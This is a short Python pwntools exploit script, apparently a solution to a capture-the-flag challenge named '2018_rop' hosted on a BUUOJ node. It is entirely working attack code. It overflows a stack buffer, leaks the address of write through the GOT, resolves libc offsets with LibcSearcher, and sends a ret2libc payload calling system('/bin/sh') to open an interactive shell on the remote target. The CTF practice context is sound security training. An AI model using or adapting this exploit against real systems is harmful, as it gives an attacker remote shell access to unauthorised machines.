# coding=utf-8

from pwn import *
from LibcSearcher import *

context.os = 'linux'
context.arch = 'i386'
context.log_level = 'debug'

#p = process('./2018_rop')
p = remote('node3.buuoj.cn', 27856)
elf = ELF('./2018_rop')

padding = 'a' * 0x88
fake_ebp = 'jkjk'
write_got = elf.got['write']
write_plt = elf.plt['write']
main_addr = elf.sym['main']

payload1 = padding + fake_ebp + p32(write_plt) + p32(main_addr) 
payload1 += p32(0) + p32(write_got) + p32(4)

p.sendline(payload1)
write_addr = u32(p.recv(4))
print('write_addr: ', hex(write_addr))

############################ system & bin_sh #############################

#libc_base = write_addr - libc.sym['write']
#system_addr = libc_base + libc.sym['system']
#bin_sh_addr = libc_base + libc.search('/bin/sh').next
libc = LibcSearcher('write', write_addr)
libc_base = write_addr - libc.dump('write')
system_addr = libc_base + libc.dump('system')
bin_sh_addr = libc_base + libc.dump('str_bin_sh')

print('libc_base: ', hex(libc_base))

payload2 = padding + fake_ebp + p32(system_addr) + 'jkjk' + p32(bin_sh_addr)
p.sendline(payload2)
p.interactive()
